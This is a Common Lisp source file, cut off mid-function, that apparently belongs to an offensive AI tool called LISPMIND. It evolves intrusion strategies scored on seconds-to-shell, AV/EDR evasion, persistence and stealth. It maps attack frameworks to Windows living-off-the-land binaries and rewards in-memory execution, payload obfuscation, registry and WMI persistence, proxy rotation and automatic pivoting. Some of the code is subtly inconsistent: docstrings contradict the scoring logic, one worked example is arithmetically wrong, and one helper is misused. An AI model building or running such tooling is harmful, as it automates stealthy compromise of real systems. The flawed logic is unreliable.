;;;; -*- Mode: Lisp; Syntax: ANSI-Common-Lisp; Base: 10 -*-
;;;
;;; EVOLUTION-V2.4.LISP — TTS-Optimized Genetic Programming for LISPMIND Tactical Swarm
;;;
;;; ═══════════════════════════════════════════════════════════════════════════
;;;     TACTICAL SWARM EVOLUTION: TIME-TO-SHELL FITNESS + LOLBIN-AWARE GP
;;; ═══════════════════════════════════════════════════════════════════════════
;;;
;;; This module extends LISPMIND v2.0's genetic programming engine with
;;; v2.4's Time-to-Shell (TTS) optimization.  Every aspect of the evolutionary
;;; pipeline has been redesigned to minimize seconds-to-compromise while
;;; maximizing evasion and persistence survival.
;;;
;;; FITNESS PHILOSOPHY: Speed is King
;;; ──────────────────────────────────
;;; In offensive operations, a strategy that takes 5 seconds to achieve a shell
;;; is exponentially more valuable than one that takes 60 seconds — even if the
;;; slower strategy has a slightly higher success rate.  TTS is the PRIMARY
;;; fitness objective, weighted at 60% of the total score.  Evasion (20%),
;;; persistence (10%), and success rate (10%) round out a multi-objective
;;; fitness function that rewards the complete tactical picture.
;;;
;;; LOLBIN-FIRST MUTATION: Hide in Plain Sight
;;; ───────────────────────────────────────────
;;; v2.4's mutation operators are LOLBin-aware.  When a mutation replaces a
;;; tool call, it PREFERS Living Off The Land Binaries over noisy frameworks.
;;; certutil, psexec.py, wmiexec.py, and powershell -enc are favored over
;;; Metasploit modules and standalone exploit frameworks.  The mutation engine
;;; knows the mapping between framework tools and their LOLBin equivalents,
;;; and it applies encoding, reflective loading, and proxy rotation as
;;; mutation operators.
;;;
;;; PENALTY ARCHITECTURE: Discipline Through Punishment
;;; ───────────────────────────────────────────────────
;;; Four penalty categories keep strategies lean and stealthy:
;;;   • HIGH-NOISE (-20%): Using Metasploit full framework, nmap -sC, etc.
;;;   • DISK-TOUCH (-15%): Writing payloads to disk instead of memory
;;;   • LOLBIN-MISS (-10%): Using a framework when a LOLBin would work
;;;   • BLOAT (-5%): Strategy trees larger than 50 nodes
;;;
;;; "In the race to shell, noise is death.  Evolve silently or die loudly."

(in-package :lispmind)


;; ═══════════════════════════════════════════════════════════════════════════
;; SECTION A: TTS Fitness Constants and Configuration
;; ═══════════════════════════════════════════════════════════════════════════

(defparameter *tts-weight-primary* 0.60
  "Weight for the primary TTS score component (1 / (1 + actual-TTS)).

This is the dominant term in the fitness function.  A strategy that achieves
shell in 10 seconds (score 0.91) will massively outrank one that takes 120
seconds (score 0.008), all else being equal.  The 60% weight reflects the
operational reality that speed is the single most important factor in
offensive success.

Tuning: Increasing this above 0.60 makes evolution almost monomaniacally
focused on speed, potentially sacrificing reliability.  Decreasing it below
0.50 allows slower-but-safer strategies to compete.  0.60 is the sweet spot." )

(defparameter *tts-weight-success* 0.20
  "Weight for the success-rate component of TTS fitness.

Success rate = (number of successful compromises) / (total attempts).
A strategy that works 100% of the time but takes 30s may outrank one that
works 50% of the time but takes 5s — this weight controls that tradeoff." )

(defparameter *tts-weight-evasion* 0.10
  "Weight for the evasion bonus component of TTS fitness.

Evasion bonuses reward LOLBin usage, in-memory execution, and other
techniques that reduce forensic visibility.  At 10%, a strategy with
perfect evasion gets a +0.10 fitness boost — enough to matter in close
competition but not enough to overcome severe speed or success deficits." )

(defparameter *tts-weight-persistence* 0.10
  "Weight for the persistence bonus component of TTS fitness.

Persistence bonuses reward strategies that include mechanisms for
maintaining access (registry run keys, scheduled tasks, WMI events).
This is weighted at 10% because persistence is valuable but secondary
to the initial compromise speed." )

(defparameter *penalty-high-noise* 0.20
  "Fitness penalty for using high-noise tools (fraction of total).

Tools flagged as HIGH-NOISE include:
  • Metasploit full framework (msfconsole, msfvenom with full payload)
  • nmap with aggressive scripting (-sC --script=vuln)
  • Nessus / OpenVAS full scans
  • Cobalt Strike beacon (known signature)
  • Empire / PoshC2 framework invocation

Penalty = -20% of total fitness.  A strategy scoring 0.80 would drop to 0.64.
This severe penalty reflects the operational risk of detection and attribution." )

(defparameter *penalty-disk-touch* 0.15
  "Fitness penalty for disk-touching operations (fraction of total).

Disk-touching operations are those that write payload or tool data to the
target filesystem.  Examples:
  • Dropping an executable to disk and running it
  • Writing a PowerShell script to %TEMP% before execution
  • Using certutil -f to save a downloaded file (vs. -encode abuse)

In-memory execution (reflective injection, .NET in-memory load) avoids
this penalty.  The -15% penalty encourages memory-only tradecraft." )

(defparameter *penalty-lolbin-miss* 0.10
  "Fitness penalty for using a framework when a LOLBin is available.

This is the 'missed opportunity' penalty.  If the target environment
supports a LOLBin (e.g., Windows with certutil available) but the strategy
uses a noisier framework tool instead, this penalty applies.

The penalty is MITIGATED when:
  • The framework provides unique post-exploitation (meterpreter migrate)
  • The target lacks LOLBin prerequisites (non-Windows, PowerShell blocked)" )

(defparameter *penalty-bloat-threshold* 50
  "Tree node count above which the bloat penalty kicks in.

Strategies with more than 50 nodes are penalized at -5% fitness.
Complex strategies are harder to deploy, slower to execute, and more
likely to trigger heuristic detection.  The 50-node threshold is based
on empirical analysis: most effective TTS strategies fit in 30-45 nodes." )

(defparameter *penalty-bloat-amount* 0.05
  "Fitness penalty for exceeding *PENALTY-BLOAT-THRESHOLD* nodes.

Flat penalty (not scaled) to keep the calculation simple and predictable." )

(defparameter *tts-score-fast-threshold* 10.0
  "TTS in seconds below which the maximum TTS score (1.0) is awarded.

Sub-10-second shell achievements represent the gold standard of offensive
operations — typically achieved via credential reuse, known-exploit chains,
or LOLBin abuse on pre-compromised paths.  Any strategy averaging <10s TTS
gets full marks for the speed component." )

(defparameter *tts-score-medium-threshold* 30.0
  "TTS in seconds below which a 0.8 TTS score is awarded.

30 seconds is the operational boundary between 'fast' and 'acceptable'.
Strategies in the 10-30s range are still operationally viable but lack
the snap of sub-10-second approaches." )

(defparameter *tts-score-slow-threshold* 60.0
  "TTS in seconds below which a 0.6 TTS score is awarded.

60 seconds is the upper bound of 'operationally acceptable' for most
engagements.  Strategies taking 30-60s are borderline — they may work
but provide ample time for defensive response." )

(defparameter *tts-score-very-slow-threshold* 120.0
  "TTS in seconds above which the minimum TTS score (0.2) is awarded.

Strategies taking >120 seconds are essentially unusable in time-constrained
engagements.  The 0.2 floor prevents a zero score (which would break some
selection algorithms) while heavily penalizing slowness." )


;; ═══════════════════════════════════════════════════════════════════════════
;; SECTION B: LOLBin Mapping — Framework to LOLBin Equivalents
;; ═══════════════════════════════════════════════════════════════════════════

(defparameter *lolbin-mapping*
  '((metasploit/exploit/windows/smb/psexec . (psexec.py wmiexec.py))
    (metasploit/payload/windows/meterpreter/reverse_tcp . (powershell-encoded certutil-urlcache))
    (metasploit/payload/windows/x64/meterpreter . (mshta-jscript rundll32-javascript))
    (nmap/-sC/-sV . (nmap/-sV/--top-ports))
    (impacket-psexec . (wmiexec.py smbexec.py))
    (impacket-smbexec . (wmiexec.py mmcexec))
    (empire/launcher . (powershell-encoded mshta-jscript))
    (cobalt-strike/beacon . (rundll32-sct cmstp-inf))
    (msfvenom/exe . (certutil-encode msbuild-xml))
    (sqlmap/full-scan . (custom-sql-ps odbc-powershell))
    (empire/privesc/invoke-ms16-032 . (psgetsid-pipe-juice))
    (metasploit/auxiliary/scanner/smb/smb_enumshares . (net-view powershell-get-smbshare))
    (hydra/brute . (runas-netonly invoke-command))
    (bloodhound/ingestor . (sharp-hound-ps net-stat-rpc))
    (responder/llmnr . (inveigh-ps llmnr-spoof-ps)))
  "Alist mapping framework tools to their LOLBin equivalents.

Each entry is (FRAMEWORK-TOOL . LOLBIN-ALTERNATIVES) where LOLBIN-ALTERNATIVES
is a list of preferred LOLBin commands, ordered by stealth (quietest first).

This mapping is used by:
  • LOLBIN-EQUIVALENT — lookup function for mutation
  • SHOULD-USE-LOLBIN-P — decision logic for framework avoidance
  • CALCULATE-EVASION-BONUS — scoring LOLBin usage in strategies

The mapping covers the most common framework tools used in offensive
operations and their Windows-native or Python-impacket alternatives.
Living Off The Land binaries are preferred because they blend into normal
system activity, lack external dependencies, and rarely trigger AV/EDR." )

(defparameter *high-noise-tools*
  '(metasploit/full-framework msfconsole msfvenom-standalone
    nmap/-sC/--script=vuln nmap/-A
    nessus full-openvas
    cobalt-strike/artifact cobalt-strike/malleable-c2/loud
    empire/launcher/pyinstaller poshc2/full-kit
    sqlmap/--risk=3 sqlmap/--level=5
    responder/WPAD-force bloodhound/sharphound-visible)
  "List of tools flagged as HIGH-NOISE for penalty calculation.

These tools have signatures, generate significant network traffic, or
leave obvious forensic artifacts.  Any strategy expression containing one
of these symbols (or symbol prefixes) receives the -20% noise penalty." )

(defparameter *disk-touching-operations*
  '(drop-executable write-payload-to-disk
    certutil/-f/-URLCACHE/save msfvenom/-f/exe/outfile
    download-and-save save-to-temp
    write-registry-payload drop-pe-to-disk)
  "List of operation types that touch disk and incur the -15% penalty.

In-memory alternatives should be used instead:
  • Reflective DLL injection instead of dropped executables
  • .NET in-memory load (Assembly.Load) instead of saved assemblies
  • PowerShell -enc instead of .ps1 files on disk
  • MSBuild inline XML instead of saved .csproj files" )

(defparameter *lolbin-terminals*
  '(certutil.exe mshta.exe rundll32.exe regsvr32.exe
    powershell.exe cmd.exe wscript.exe cscript.exe
    schtasks.exe wmic.exe msbuild.exe cmstp.exe
    psexec.py wmiexec.py smbexec.py secretsdump.py
    ssh.exe net.exe sc.exe bitsadmin.exe forfiles.exe
    syncappvpublishingserver.exe installutil.exe)
  "Extended terminal set for LOLBin-aware GP trees.

These Windows-native and Impacket tools are added to the terminal set
when generating strategies for LOLBin-preferred environments.  They serve
as leaf nodes in evolved S-expressions, representing the actual tools used
at execution time." )


;; ═══════════════════════════════════════════════════════════════════════════
;; SECTION C: TTS Fitness Scoring Functions
;; ═══════════════════════════════════════════════════════════════════════════

(defun calculate-tts-score (actual-tts)
  "Convert TTS in seconds to a normalized fitness score (0.0-1.0).

SCORING TIERS:
  TTS < 10s  → 1.0  (lightning fast — gold standard)
  TTS < 30s  → 0.8  (fast — operationally excellent)
  TTS < 60s  → 0.6  (acceptable — within defensive response window)
  TTS < 120s → 0.4  (slow — risky, may trigger automated response)
  TTS >= 120s → 0.2 (very slow — effectively unusable)

The scoring is piecewise-linear between thresholds.  For example, TTS=20s
scores 0.9 (midway between 0.8 at 30s and 1.0 at 10s).

Parameters:
  ACTUAL-TTS — Float, time-to-shell in seconds from test case execution.

Returns:
  Float in [0.2, 1.0] representing the speed component score.

Example:
  (calculate-tts-score 5.0)   => 1.0
  (calculate-tts-score 45.0)  => 0.6
  (calculate-tts-score 150.0) => 0.2"
  (cond
    ;; Lightning fast: sub-10 seconds
    ((< actual-tts *tts-score-fast-threshold*)
     1.0)
    ;; Fast: 10-30 seconds (linear interpolation 1.0 → 0.8)
    ((< actual-tts *tts-score-medium-threshold*)
     (+ 0.8 (* 0.02 (- *tts-score-medium-threshold* actual-tts))))
    ;; Acceptable: 30-60 seconds (linear interpolation 0.8 → 0.6)
    ((< actual-tts *tts-score-slow-threshold*)
     (+ 0.6 (* 0.00667 (- *tts-score-slow-threshold* actual-tts))))
    ;; Slow: 60-120 seconds (linear interpolation 0.6 → 0.4)
    ((< actual-tts *tts-score-very-slow-threshold*)
     (+ 0.4 (* 0.00333 (- *tts-score-very-slow-threshold* actual-tts))))
    ;; Very slow: 120+ seconds — minimum score
    (t
     0.2)))

(defun calculate-evasion-bonus (chromosome)
  "Calculate evasion bonus based on LOLBin usage and in-memory execution.

The evasion bonus (0.0 to 1.0) rewards strategies that employ stealthy
techniques.  It is computed by scanning the chromosome's expression tree
and scoring each stealth indicator found.

BONUS COMPONENTS:
  • LOLBin usage (+0.3 per LOLBin, max +0.6): Each Living Off The Land
    binary found in the expression adds 0.3 to the bonus.  Max capped at
    0.6 to prevent LOLBin-stacking from dominating the score.
  • In-memory execution (+0.3): Presence of reflective loader, .NET
    Assembly.Load, or PowerShell -enc indicates memory-only tradecraft.
  • Encoding/obfuscation (+0.1): Base64, XOR, or other payload encoding.

The total is clamped to [0.0, 1.0] and then multiplied by
*TTS-WEIGHT-EVASION* (10%) in the main TTS-FITNESS function.

Parameters:
  CHROMOSOME — A STRATEGY-CHROMOSOME struct whose expression is scanned.

Returns:
  Float in [0.0, 1.0] representing the evasion bonus score.

Example:
  (calculate-evasion-bonus my-chrom)
    => 0.7   ; uses certutil + reflective loader (0.6 + 0.3 = 0.9, clamped to 0.7)"
  (let ((expr (strategy-chromosome-expression chromosome))
        (lolbin-count 0)
        (has-in-memory nil)
        (has-encoding nil))
    ;; Scan the expression tree for stealth indicators
    (labels ((scan (node)
               (cond
                 ((atom node)
                  ;; Check if this atom is a LOLBin
                  (when (member node *lolbin-terminals* :test #'symbol-match)
                    (incf lolbin-count))
                  ;; Check for in-memory indicators
                  (when (member node '(reflective-load assembly-load
                                       powershell-encoded Invoke-ReflectivePEInjection
                                       in-memory-exec dotnet-in-memory)
                                :test #'symbol-match)
                    (setf has-in-memory t))
                  ;; Check for encoding indicators
                  (when (member node '(base64-encode xor-encode
                                       obfuscate-ps encode-payload)
                                :test #'symbol-match)
                    (setf has-encoding t)))
                 ;; Recurse into list nodes
                 ((consp node)
                  (dolist (child (cdr node))
                    (scan child))))))
      (scan expr))
    ;; Calculate composite bonus
    (let ((lolbin-score (min (* 0.3 lolbin-count) 0.6))
          (memory-score (if has-in-memory 0.3 0.0))
          (encoding-score (if has-encoding 0.1 0.0)))
      (min 1.0 (+ lolbin-score memory-score encoding-score)))))

(defun symbol-match (sym1 sym2)
  "Check if two symbols match, allowing for keyword/package variance.

Matches if the symbol names are EQUALP (case-insensitive).  This allows
LOLBIN terminals (like CERTUTIL.EXE) to match against expression symbols
regardless of their package or case.

Parameters:
  SYM1, SYM2 — Symbols to compare.

Returns:
  T if the symbol names match case-insensitively, NIL otherwise."
  (and (symbolp sym1) (symbolp sym2)
       (equalp (symbol-name sym1) (symbol-name sym2))))

(defun calculate-persistence-bonus (chromosome)
  "Calculate bonus for persistence-capable strategies.

The persistence bonus (0.0 to 1.0) rewards strategies that include
mechanisms for maintaining access after initial compromise.  Persistence
is scored by detecting persistence-related symbols in the expression tree.

PERSISTENCE INDICATORS (scored cumulatively, max 1.0):
  • Registry run key (+0.3): reg-add-runkey, HKCU-run, HKLM-run
  • Scheduled task (+0.3): schtasks-create, at-command, scheduled-job
  • WMI event subscription (+0.3): wmi-event-filter, __EventFilter
  • Service creation (+0.2): sc-create, new-service
  • Startup folder (+0.1): startup-folder-drop, appdata-startup
  • DLL hijack (+0.2): dll-hijack-search-order, path-persistence

The total is clamped to [0.0, 1.0] and multiplied by
*TTS-WEIGHT-PERSISTENCE* (10%) in TTS-FITNESS.

Parameters:
  CHROMOSOME — A STRATEGY-CHROMOSOME struct.

Returns:
  Float in [0.0, 1.0] representing the persistence bonus score.

Example:
  (calculate-persistence-bonus my-chrom)
    => 0.6   ; has registry run key + scheduled task (0.3 + 0.3)"
  (let ((expr (strategy-chromosome-expression chromosome))
        (score 0.0))
    (labels ((scan (node)
               (cond
                 ((atom node)
                  (case-match node
                    ;; Registry run keys
                    ((reg-add-runkey HKCU-run HKLM-run
                      registry-runkey reg-run-once)
                     (incf score 0.3))
                    ;; Scheduled tasks
                    ((schtasks-create at-command scheduled-job
                      task-scheduler-persist)
                     (incf score 0.3))
                    ;; WMI event subscription
                    ((wmi-event-filter __EventFilter wmi-subscription
                      active-script-event-consumer)
                     (incf score 0.3))
                    ;; Service creation
                    ((sc-create new-service create-service
                      service-binary-hijack)
                     (incf score 0.2))
                    ;; Startup folder
                    ((startup-folder-drop appdata-startup
                      common-startup-write)
                     (incf score 0.1))
                    ;; DLL hijacking
                    ((dll-hijack-search-order path-persistence
                      dll-sideload)
                     (incf score 0.2))))
                 ((consp node)
                  (dolist (child (cdr node))
                    (scan child))))))
      (scan expr)
      (min 1.0 score))))

(defun case-match (sym cases)
  "Check if SYM matches any symbol in CASES (case-insensitive).

Helper for CALCULATE-PERSISTENCE-BONUS that performs case-insensitive
symbol matching against a list of known persistence technique names.

Parameters:
  SYM   — Symbol to check.
  CASES — List of symbols to match against.

Returns:
  T if SYM's name matches any symbol in CASES case-insensitively."
  (member sym cases :test #'symbol-match))

(defun calculate-noise-penalty (chromosome)
  "Calculate penalty for high-noise tool usage.

Scans the chromosome expression for known high-noise tools (see
*HIGH-NOISE-TOOLS*) and returns the penalty amount (0.0 to 0.20).

The penalty is ALL-OR-NOTHING: if ANY high-noise tool is found, the full
*PENALTY-HIGH-NOISE* (0.20) is returned.  This reflects the binary nature
of detection — one noisy tool can blow the entire operation's stealth.

Parameters:
  CHROMOSOME — A STRATEGY-CHROMOSOME struct.

Returns:
  Float: 0.0 if no noise tools found, *PENALTY-HIGH-NOISE* (0.20) otherwise.

Example:
  (calculate-noise-penalty noisy-chrom)   => 0.20
  (calculate-noise-penalty quiet-chrom)   => 0.0   ; uses LOLBins only"
  (let ((expr (strategy-chromosome-expression chromosome)))
    (labels ((scan (node)
               (cond
                 ((atom node)
                  (when (is-high-noise-tool-p node)
                    (return-from calculate-noise-penalty *penalty-high-noise*)))
                 ((consp node)
                  (dolist (child (cdr node))
                    (scan child))))))
      (scan expr)
      0.0)))

(defun is-high-noise-tool-p (tool-symbol)
  "Check if TOOL-SYMBOL names a high-noise tool.

Performs case-insensitive matching against *HIGH-NOISE-TOOLS*.  Also
checks for symbol-name prefix matching so that variants like
METASPLOIT/EXPLOIT/WINDOWS/SMB/PSEXEC match METASPLOIT/FULL-FRAMEWORK.

Parameters:
  TOOL-SYMBOL — Symbol naming a tool.

Returns:
  T if the tool is classified as high-noise, NIL otherwise."
  (when (symbolp tool-symbol)
    (let ((tool-name (symbol-name tool-symbol)))
      (some (lambda (noise-tool)
              (or (equalp tool-name (symbol-name noise-tool))
                  ;; Prefix matching for framework variants
                  (and (> (length tool-name) 10)
                       (> (length (symbol-name noise-tool)) 10)
                       (string-equal (subseq tool-name 0 10)
                                     (subseq (symbol-name noise-tool) 0 10)))))
            *high-noise-tools*))))

(defun calculate-disk-penalty (chromosome)
  "Calculate penalty for disk-touching operations.

Scans the chromosome expression for operations that write to disk and
returns the penalty amount (0.0 to 0.15).

Like noise penalty, this is ALL-OR-NOTHING: any disk-touching operation
incurs the full *PENALTY-DISK-TOUCH* (0.15).  The rationale is that disk
artifacts are the #1 source of forensic detection — in-memory execution
is always preferred.

Parameters:
  CHROMOSOME — A STRATEGY-CHROMOSOME struct.

Returns:
  Float: 0.0 if no disk operations, *PENALTY-DISK-TOUCH* (0.15) otherwise."
  (let ((expr (strategy-chromosome-expression chromosome)))
    (labels ((scan (node)
               (cond
                 ((atom node)
                  (when (member node *disk-touching-operations* :test #'symbol-match)
                    (return-from calculate-disk-penalty *penalty-disk-touch*)))
                 ((consp node)
                  (dolist (child (cdr node))
                    (scan child))))))
      (scan expr)
      0.0)))

(defun calculate-bloat-penalty (chromosome)
  "Calculate penalty for overly complex strategies.

If the chromosome's expression tree has more than *PENALTY-BLOAT-THRESHOLD*
nodes (default 50), returns *PENALTY-BLOAT-AMOUNT* (0.05).  Otherwise 0.0.

Bloated strategies (>50 nodes) are operationally problematic:
  • Longer to transmit and deploy
  • Higher chance of typographical errors
  • More execution time (each node is an operation)
  • More likely to trigger behavioral detection heuristics

This penalty is separate from the standard GP bloat penalty controlled by
*BLOAT-PENALTY-FACTOR*, which is a continuous function of tree size.  The
TTS bloat penalty is a step function — once you cross 50 nodes, you pay.

Parameters:
  CHROMOSOME — A STRATEGY-CHROMOSOME struct.

Returns:
  Float: 0.0 if tree is <= 50 nodes, 0.05 otherwise."
  (if (> (tree-size (strategy-chromosome-expression chromosome))
         *penalty-bloat-threshold*)
      *penalty-bloat-amount*
    0.0))

(defun tts-fitness (chromosome fitness-data)
  "Primary fitness function: Time-to-Shell optimization.

This is the v2.4 fitness function that replaces the generic STRATEGY-FITNESS
for offensive operations.  It evaluates a chromosome based on four weighted
objectives with four penalty categories.

FITNESS-DATA is an alist of test cases, each of form:
  ((:target . target-info)
   (:actual-tts . seconds)
   (:success-p . t/nil)
   (:tools-used . (tool-symbols))
   (:disk-touched-p . t/nil))

FITNESS FORMULA:
  base = (* 0.60 tts-score) + (* 0.20 success-rate) +
         (* 0.10 evasion-bonus) + (* 0.10 persistence-bonus)
  penalties = noise-penalty + disk-penalty + lolbin-miss-penalty + bloat-penalty
  final = max(0.0, (- base penalties))

COMPONENTS:
  TTS-SCORE (60%): Mean of (1 / (1 + actual-TTS)) across successful cases.
                   Lower actual TTS → higher score.  Uses CALCULATE-TTS-SCORE.
  SUCCESS-RATE (20%): Fraction of test cases where :SUCCESS-P is T.
  EVASION-BONUS (10%): From CALCULATE-EVASION-BONUS — LOLBin and memory usage.
  PERSISTENCE-BONUS (10%): From CALCULATE-PERSISTENCE-BONUS — persistence techniques.

PENALTIES:
  -20%: High-noise tool used (CALCULATE-NOISE-PENALTY)
  -15%: Disk touched (CALCULATE-DISK-PENALTY)
  -10%: Framework used where LOLBin available (CALCULATE-LOLBIN-MISS-PENALTY)
   -5%: Tree > 50 nodes (CALCULATE-BLOAT-PENALTY)

Parameters:
  CHROMOSOME   — STRATEGY-CHROMOSOME struct to evaluate.
  FITNESS-DATA — Alist of test case results (see above).

Returns:
  Float in [0.0, 1.0] representing the composite TTS fitness score.
  The score is stored in the chromosome's FITNESS slot as a side effect.

Example:
  (tts-fitness my-chrom '(((:target . :windows-smb) (:actual-tts . 8.5)
                           (:success-p . t) (:tools-used . (psexec.py))
                           (:disk-touched-p . nil))))
    => 0.95   ; fast TTS (score 0.94) + success (0.20) + LOLBin bonus (0.10) - no penalties"
  (let ((tts-sum 0.0)
        (success-count 0)
        (total-cases 0)
        (case-scores '()))
    ;; Process each test case
    (dolist (test-case fitness-data)
      (let ((actual-tts (cdr (assoc :actual-tts test-case)))
            (success-p (cdr (assoc :success-p test-case))))
        (incf total-cases)
        (when success-p
          (incf success-count))
        ;; TTS score for this case (0.0 if failed)
        (let ((case-tts-score (if success-p
                                  (calculate-tts-score (or actual-tts 999.0))
                                0.0)))
          (incf tts-sum case-tts-score)
          (push case-tts-score case-scores))))
    ;; Compute components
    (let* ((mean-tts-score (if (> total-cases 0)
                               (/ tts-sum total-cases)
                             0.0))
           (success-rate (if (> total-cases 0)
                             (/ success-count total-cases)
                           0.0))
           (evasion-bonus (calculate-evasion-bonus chromosome))
           (persistence-bonus (calculate-persistence-bonus chromosome))
           ;; Calculate weighted base score
           (base-score (+ (* *tts-weight-primary* mean-tts-score)
                          (* *tts-weight-success* success-rate)
                          (* *tts-weight-evasion* evasion-bonus)
                          (* *tts-weight-persistence* persistence-bonus)))
           ;; Calculate all penalties
           (noise-pen (calculate-noise-penalty chromosome))
           (disk-pen (calculate-disk-penalty chromosome))
           (lolbin-miss-pen (calculate-lolbin-miss-penalty chromosome fitness-data))
           (bloat-pen (calculate-bloat-penalty chromosome))
           (total-penalties (+ noise-pen disk-pen lolbin-miss-pen bloat-pen))
           ;; Apply penalties
           (final-score (max 0.0 (- base-score total-penalties))))
      ;; Store and return
      (setf (strategy-chromosome-fitness chromosome) (float final-score 0.0))
      (float final-score 0.0))))

(defun calculate-lolbin-miss-penalty (chromosome fitness-data)
  "Calculate penalty for using a framework when LOLBin was available.

This penalty requires FITNESS-DATA context because the availability of
LOLBins depends on the target environment.  For each test case where:
  1. The target supports LOLBins (Windows environment, not locked down)
  2. A framework tool was used instead of an available LOLBin

The penalty *PENALTY-LOLBIN-MISS* (0.10) is applied.  If ANY case triggers
this, the full penalty is applied (binary, like other penalties).

Parameters:
  CHROMOSOME   — STRATEGY-CHROMOSOME struct (expression scanned for tools).
  FITNESS-DATA — Alist with :TARGET and :TOOLS-USED entries.

Returns:
  Float: 0.0 if no miss, *PENALTY-LOLBIN-MISS* (0.10) otherwise."
  (let ((expr (strategy-chromosome-expression chromosome)))
    (labels ((scan-for-framework-tools (node tools)
               (cond
                 ((atom node)
                  (when (is-framework-tool-p node)
                    (push node tools)))
                 ((consp node)
                  (dolist (child (cdr node))
                    (scan-for-framework-tools child tools))))
               tools)
             ;; Check if target would support LOLBins
             (target-supports-lolbin-p (target-info)
               (or (null target-info)  ; unknown target, assume LOLBin available
                   (and (symbolp target-info)
                        (member target-info '(:windows :windows-10 :windows-11
                                              :windows-server :domain-joined
                                              :corporate-windows)
                                :test #'eq)))))
      ;; For each test case, check if framework was used where LOLBin works
      (dolist (test-case fitness-data)
        (let* ((target-info (cdr (assoc :target test-case)))
               (tools-used (cdr (assoc :tools-used test-case)))
               (has-framework (some #'is-framework-tool-p (or tools-used '(nil)))))
          (when (and has-framework
                     (target-supports-lolbin-p target-info)
                     ;; Check if a LOLBin equivalent exists
                     (some (lambda (tool)
                             (lolbin-equivalent tool))
                           (remove-if-not #'is-framework-tool-p
                                          (or tools-used '()))))
            (return-from calculate-lolbin-miss-penalty *penalty-lolbin-miss*))))
      ;; Also scan the expression itself for framework tools with LOLBin equivalents
      (let ((found-tools '()))
        (scan-for-framework-tools expr found-tools)
        (dolist (tool found-tools)
          (when (lolbin-equivalent tool)
            (return-from calculate-lolbin-miss-penalty *penalty-lolbin-miss*))))
      ;; No miss detected
      0.0)))

(defun is-framework-tool-p (tool-symbol)
  "Check if TOOL-SYMBOL represents a framework tool (not a LOLBin).

Framework tools are identified by their package/namespace prefix or by
explicit listing.  This is the inverse of LOLBin detection.

Parameters:
  TOOL-SYMBOL — Symbol to classify.

Returns:
  T if the tool is a framework tool, NIL if it's a LOLBin or unknown."
  (when (symbolp tool-symbol)
    (let ((name (symbol-name tool-symbol)))
      (or ;; Metasploit family
          (search "METASPLOIT" name :test #'char-equal)
          ;; Empire family
          (search "EMPIRE" name :test #'char-equal)
          ;; Cobalt Strike family
          (search "COBALT" name :test #'char-equal)
          ;; PoshC2
          (search "POSHC2" name :test #'char-equal)
          ;; Nessus / OpenVAS
          (search "NESSUS" name :test #'char-equal)
          (search "OPENVAS" name :test #'char-equal)
          ;; SQLMap aggressive
          (search "SQLMAP" name :test #'char-equal)
          ;; Full BloodHound (vs. quiet SharpHound)
          (search "BLOODHOUND" name :test #'char-equal)
          ;; Explicit framework markers
          (search "FRAMEWORK" name :test #'char-equal)
          ;; Nmap aggressive
          (and (search "NMAP" name :test #'char-equal)
               (or (search "-SC" name :test #'char-equal)
                   (search "-A" name :test #'char-equal)))))))


;; ═══════════════════════════════════════════════════════════════════════════
;; SECTION D: LOLBin-Aware Mutation Operators
;; ═══════════════════════════════════════════════════════════════════════════

(defun lolbin-equivalent (framework-tool)
  "Return the LOLBin equivalent of a framework tool.

Looks up FRAMEWORK-TOOL in *LOLBIN-MAPPING* and returns the first (quietest)
LOLBin alternative.  If no mapping exists, returns NIL.

MAPPING TABLE:
  metasploit/exploit/windows/smb/psexec       → psexec.py
  metasploit/payload/windows/meterpreter/r_tcp → powershell-encoded
  metasploit/payload/windows/x64/meterpreter   → mshta-jscript
  nmap -sC -sV                                → nmap -sV --top-ports 100
  impacket-psexec                              → wmiexec.py
  impacket-smbexec                             → wmiexec.py
  empire/launcher                              → powershell-encoded
  cobalt-strike/beacon                         → rundll32-sct
  msfvenom/exe                                 → certutil-encode
  sqlmap/full-scan                             → custom-sql-ps
  bloodhound/ingestor                          → sharp-hound-ps

Parameters:
  FRAMEWORK-TOOL — Symbol naming a framework tool.

Returns:
  Symbol naming the preferred LOLBin equivalent, or NIL if no mapping.

Example:
  (lolbin-equivalent 'metasploit/exploit/windows/smb/psexec)
    => PSEXEC.PY
  (lolbin-equivalent 'unknown-tool)
    => NIL"
  (cdr (assoc framework-tool *lolbin-mapping*)))

(defun mutate-subtree-tts-optimized (expression max-depth
                                       &optional terminals functions)
  "Mutation operator optimized for TTS minimization and evasion maximization.

This mutation operator extends the standard MUTATE-SUBTREE with seven
specialized mutation operators that understand offensive tradecraft.  It
replaces a random subtree with a mutation that is biased toward speed,
stealth, and operational effectiveness.

MUTATION OPERATORS (applied in order of preference):

1. LOLBIN-SWAP (30% probability when applicable):
   Replace a framework tool call with its LOLBin equivalent.
   Example: metasploit/psexec → wmiexec.py

2. ENCODE-PAYLOAD (15% probability):
   Wrap a payload delivery node in base64 or XOR encoding.
   Example: powershell-command → (base64-encode powershell-command)

3. REFLECTIVE-WRAP (15% probability):
   Wrap execution in a reflective loader to avoid disk writes.
   Example: drop-and-run → (reflective-load payload)

4. PROXY-CHAIN (10% probability):
   Add proxy rotation to a network connection node.
   Example: direct-connect → (proxy-rotate direct-connect)

5. PERSISTENCE-INJECT (10% probability):
   Inject a persistence mechanism into an exploit flow.
   Example: (exploit target) → (progn (exploit target) (inject-persistence))

6. PIVOT-AUTO (10% probability):
   Add automatic pivot spawn on successful compromise.
   Example: (get-shell target) → (progn (get-shell target) (pivot-to target))

7. TRADITIONAL (fallback, 10% or when none above apply):
   Standard random subtree replacement from existing terminals/functions.

Parameters:
  EXPRESSION  — S-expression tree to mutate.
  MAX-DEPTH   — Maximum depth for the replacement subtree.
  TERMINALS   — List of terminal atoms (optional, for traditional fallback).
  FUNCTIONS   — List of function symbols (optional, for traditional fallback).

Returns:
  New S-expression with the mutation applied.  The original is not modified.

Example:
  (mutate-subtree-tts-optimized
    '(metasploit/exploit/windows/smb/psexec target) 5)
    => (WMIEXEC.PY TARGET)   ; LOLBIN-SWAP mutation"
  (let ((r (random 1.0)))
    (cond
      ;; Operator 1: LOLBIN-SWAP (highest priority)
      ((and (< r 0.30) (has-framework-tool-p expression))
       (apply-lolbin-swap expression max-depth terminals functions))
      ;; Operator 2: ENCODE-PAYLOAD
      ((< r 0.45)
       (apply-encode-payload expression max-depth terminals functions))
      ;; Operator 3: REFLECTIVE-WRAP
      ((< r 0.60)
       (apply-reflective-wrap expression max-depth terminals functions))
      ;; Operator 4: PROXY-CHAIN
      ((< r 0.70)
       (apply-proxy-chain expression max-depth terminals functions))
